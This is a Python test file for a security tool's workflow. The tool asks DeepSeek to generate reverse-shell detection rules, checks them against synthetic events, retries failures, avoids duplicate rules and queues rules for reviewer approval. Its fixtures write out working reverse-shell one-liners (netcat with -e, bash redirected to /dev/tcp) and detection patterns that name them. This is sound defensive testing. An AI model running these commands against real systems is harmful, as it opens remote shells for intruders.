"""2.2.47: reverse-shell rules from DeepSeek pass, and each request brings a new rule.

Field report: reverse-shell rules never passed (the model put every tool and
every indicator in one ANDed base_match) and after a while every request
returned the rule that was already there (same prompt, low temperature).

Saha bildirimi: ters kabuk kuralları hiç onaylanmıyordu ve bir süre sonra
hep aynı kural geliyordu.
"""
import copy
import json
import time
from pathlib import Path

import pytest

from satsuma import ai_rule_package as pkg, deepseek_client as client, deepseek_workflow as workflow, rule_adapter as adapter
from satsuma.store import Store

CONFIG = {'rule_adapter_enabled': True, 'deepseek_enabled': True}
FIELD = json.loads((Path(__file__).parent / 'fixtures/deepseek-field-revshell-20261104.json').read_text())


@pytest.fixture
def store(tmp_path):
    value = Store(tmp_path / 'data', test=True)
    yield value
    value.close()


def field_reply():
    raw = copy.deepcopy(FIELD)
    raw['response_proposal'].pop('detection_sha256')
    return raw


def variant(rule_id, base_match, positive, negative):
    raw = field_reply()
    raw['rule_id'] = raw['detection']['id'] = raw['response_proposal']['rule_id'] = rule_id
    raw['detection']['base_match'] = base_match
    raw['test_cases'] = {'positive': positive, 'negative': negative,
                         'wrong_source': [dict(positive[0], source='dns')]}
    return raw


NC = variant('SATSUMA-AI-REVSHELL-NC', {'source': 'sys_proc', 'cmd_contains': ['nc -e', 'ncat -e']},
             [{'source': 'sys_proc', 'cmd': 'nc -e /bin/sh 203.0.113.10 4444'},
              {'source': 'sys_proc', 'cmd': 'ncat 203.0.113.10 4444 -e /bin/bash'}],
             [{'source': 'sys_proc', 'cmd': 'nc -l 8080'}])
DEVTCP = variant('SATSUMA-AI-REVSHELL-DEVTCP', {'source': 'sys_proc', 'cmd_arg_contains': ['/dev/tcp/', '/dev/udp/']},
                 [{'source': 'sys_proc', 'cmd': "bash -c 'bash -i >& /dev/tcp/203.0.113.10/4444 0>&1'"}],
                 [{'source': 'sys_proc', 'cmd': 'bash -i'}])


class Model:
    """Replies in order and records each prompt; nothing leaves the machine."""
    def __init__(self, monkeypatch, *replies):
        self.replies, self.prompts = [copy.deepcopy(r) for r in replies], []
        monkeypatch.setattr(client, '_request', self)

    def __call__(self, prompt, config, confirmed, **kwargs):
        self.prompts.append((prompt, kwargs.get('temperature')))
        return self.replies.pop(0)


def test_the_field_reply_fails_and_its_correction_is_used(store, monkeypatch):
    model = Model(monkeypatch, field_reply(), NC)
    result = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)
    assert result['status'] == 'generated' and result['test_report']['passed'], result
    assert result['package']['rule_id'] == 'SATSUMA-AI-REVSHELL-NC'
    assert result['api_requests'] == 2 and 'corrected_by_second_request' in result['completed_locally']
    second = model.prompts[1][0]
    # The failing synthetic event goes back with the reason; no host data.
    assert 'nc -e /bin/sh 203.0.113.10 4444' in second and 'was not matched' in second
    assert 'ONE variant' in second
    assert adapter.queue_package(store, result['package'], authorized=True, reviewer=1000)['queued']


def test_a_reply_that_passes_is_not_sent_again(store, monkeypatch):
    model = Model(monkeypatch, NC)
    result = adapter.research_and_generate(store, 'T1059', 'reverse_shell', CONFIG, confirmed=True)
    assert result['status'] == 'generated' and result['api_requests'] == 1 and len(model.prompts) == 1


def test_two_failures_leave_the_package_for_editing(store, monkeypatch):
    Model(monkeypatch, field_reply(), field_reply())
    result = adapter.research_and_generate(store, 'T1059', 'reverse_shell', CONFIG, confirmed=True)
    assert result['status'] == 'validation_failed' and result['api_requests'] == 2
    assert result['package']['test_cases'] and not result['test_report']['passed']


def test_rules_already_present_are_named_and_a_repeat_is_asked_again(store, monkeypatch):
    first = Model(monkeypatch, NC)
    package = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)['package']
    assert adapter.queue_package(store, package, authorized=True, reviewer=1000)['queued']
    assert first.prompts[0][1] == 0.4            # nothing known yet
    repeat = variant('SATSUMA-AI-OTHER-NAME', NC['detection']['base_match'], NC['test_cases']['positive'], NC['test_cases']['negative'])
    model = Model(monkeypatch, repeat, DEVTCP)
    result = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)
    prompt, temperature = model.prompts[0]
    assert '"cmd_contains":["nc -e","ncat -e"]' in prompt and 'do not repeat them' in prompt and temperature == 0.7
    assert 'already present' in model.prompts[1][0]
    assert result['status'] == 'generated' and result['package']['rule_id'] == 'SATSUMA-AI-REVSHELL-DEVTCP'
    assert result['known_rules_sent'] == 1


def test_a_rejected_rule_is_also_not_offered_again(store, monkeypatch):
    Model(monkeypatch, NC)
    package = adapter.research_and_generate(store, 'T1059', 'reverse_shell', CONFIG, confirmed=True)['package']
    adapter.queue_package(store, package, authorized=True, reviewer=1000)
    adapter.reject_rule(store, package['rule_id'], authorized=True, reviewer=1000, reason='istenmedi')
    assert adapter._known_rules(store, 'reverse_shell', 'T1059') == [NC['detection']['base_match']]
    assert adapter._known_rules(store, 'persistence', 'T1547') == []


def test_prompt_names_the_reverse_shell_variants_and_stays_bounded(monkeypatch):
    sent = {}
    monkeypatch.setattr(client, '_request', lambda prompt, config, confirmed, **k: sent.setdefault('p', prompt))
    known = [{'source': 'sys_proc', 'cmd_contains': ['x' * 500]}] * 40
    feedback = {'errors': ['e' * 500] * 40, 'failed': [{'case': 'positive', 'event': {'cmd': 'y' * 900}}] * 40}
    client.generate_rule('T1059.004', 'reverse_shell', adapter.SCHEMA_HINT, {}, confirmed=True, known=known, feedback=feedback)
    assert 'nc -e' in sent['p'] and '/dev/tcp' in sent['p'] and 'sh -c' in sent['p']
    assert len(sent['p'].encode()) < 32768
    assert sent['p'].count('\n- ') <= client.MAX_KNOWN + 16


def test_the_hour_counts_the_second_request(store):
    store.db.execute('''CREATE TABLE IF NOT EXISTS deepseek_requests (
        uid INTEGER, request_id TEXT, request_hash TEXT, method TEXT, created REAL,
        result TEXT, PRIMARY KEY(uid,request_id))''')
    now = time.time()
    store.db.execute('INSERT INTO deepseek_requests VALUES(1,?,?,?,?,?)', ('a' * 32, 'h', 'deepseek_generate', now, json.dumps({'ok': True, 'api_requests': 2})))
    store.db.execute('INSERT INTO deepseek_requests VALUES(1,?,?,?,?,?)', ('b' * 32, 'h', 'deepseek_test_connection', now, json.dumps({'ok': True})))
    store.db.execute('INSERT INTO deepseek_requests VALUES(1,?,?,?,?,?)', ('c' * 32, 'h', 'deepseek_generate', now, json.dumps({'ok': False})))
    store.db.commit()
    assert workflow._recent_network_requests(store)[0] == 3


def test_field_package_reaches_the_review_queue_through_the_operator_path(store, monkeypatch):
    Model(monkeypatch, field_reply(), DEVTCP)
    result = workflow.dispatch(store, 1000, 'deepseek_generate', {'request_id': 'f' * 32, 'confirmed': True,
                               'technique': 'T1059.004', 'attack_type': 'reverse_shell'}, CONFIG)
    assert result['ok'] and result['status'] == 'generated', result
    queued = workflow.dispatch(store, 1000, 'deepseek_submit', {'request_id': 'e' * 32, 'package': result['package']}, CONFIG)
    assert queued['queued'] and pkg.test_package(result['package'])['passed']


def test_panel_says_what_the_generation_produced():
    pytest.importorskip('PyQt6.QtWidgets')
    from satsuma.dashboard_qt.panels.deepseek import generation_text
    assert 'testi geçti' in generation_text({'status': 'generated', 'completed_locally': ['corrected_by_second_request']})
    assert 'ikinci denemede' in generation_text({'status': 'generated', 'completed_locally': ['corrected_by_second_request']})
    assert 'tekrarladı' in generation_text({'status': 'duplicate', 'known_rules_sent': 3})
    failed = generation_text({'status': 'validation_failed', 'test_report': {'cases': [{'case': 'positive', 'index': 1, 'passed': False}]}})
    assert 'olumlu örnek 2 yakalanmadı' in failed
